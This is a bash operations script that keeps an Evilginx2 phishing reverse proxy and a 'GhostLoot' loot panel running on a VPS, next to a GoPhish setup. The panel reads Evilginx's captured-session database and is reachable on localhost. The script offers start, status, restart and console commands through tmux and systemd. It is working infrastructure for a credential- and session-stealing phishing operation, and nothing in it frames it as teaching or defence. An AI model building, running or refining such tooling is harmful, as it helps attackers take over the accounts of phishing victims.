#!/usr/bin/env bash
# VPS side: keep Evilginx + GhostLoot up. Never binds 8080 (GoPhish).
# Never pkill, never touches SSH. Panel stays on 127.0.0.1:8090.
set -euo pipefail

PANEL_BIN="${GHOSTLOOT_BIN:-/home/ubuntu/evilginx-dashboard}"
PANEL_ADDR="${GHOSTLOOT_ADDR:-127.0.0.1:8090}"
DB="${GHOSTLOOT_DB:-/root/.evilginx/data.db}"
EVIL_DIR="${EVILGINX_DIR:-/opt/evilginx2}"
EVIL_BIN="${EVILGINX_BIN:-./evilginx2}"
EVIL_SESSION="${EVILGINX_TMUX:-evilginx}"

cmd="${1:-status}"

panel_http() { curl -sf -o /dev/null --max-time 1 "http://${PANEL_ADDR}/"; }
evilginx_up() { pgrep -x evilginx2 >/dev/null 2>&1; }

start_panel() {
  if panel_http; then return 0; fi
  if [[ -f /etc/systemd/system/ghostloot.service ]]; then
    sudo systemctl start ghostloot
    return 0
  fi
  if ! sudo tmux has-session -t ghostloot 2>/dev/null; then
    sudo tmux new-session -d -s ghostloot "${PANEL_BIN} -addr ${PANEL_ADDR} -db ${DB}"
  fi
}

start_evilginx() {
  if evilginx_up; then return 0; fi
  if tmux has-session -t "$EVIL_SESSION" 2>/dev/null; then
    tmux send-keys -t "$EVIL_SESSION" "cd ${EVIL_DIR} && sudo ${EVIL_BIN} -p ./phishlets" C-m
  else
    tmux new-session -d -s "$EVIL_SESSION" -n main "cd ${EVIL_DIR} && sudo ${EVIL_BIN} -p ./phishlets"
  fi
}

wait_panel() {
  local i
  for i in $(seq 1 25); do
    if panel_http; then return 0; fi
    sleep 0.2
  done
  return 1
}

print_status() {
  local p="down" e="down"
  if panel_http; then p="up"; fi
  if evilginx_up; then e="up"; fi
  printf "panel     %s   %s\n" "$p" "$PANEL_ADDR"
  printf "evilginx  %s   tmux %s\n" "$e" "$EVIL_SESSION"
}

case "$cmd" in
  status) print_status ;;
  up)
    start_panel
    start_evilginx
    wait_panel || { print_status; echo "panel no responde en ${PANEL_ADDR}" >&2; exit 1; }
    print_status
    ;;
  restart-panel)
    if [[ -f /etc/systemd/system/ghostloot.service ]]; then
      sudo systemctl restart ghostloot
    else
      echo "no hay unidad systemd ghostloot" >&2
      exit 1
    fi
    wait_panel || { echo "panel no volvió" >&2; exit 1; }
    print_status
    ;;
  console)
    exec tmux attach -t "$EVIL_SESSION"
    ;;
  *)
    echo "uso: ghostloot-host {up|status|restart-panel|console}" >&2
    exit 2
    ;;
esac
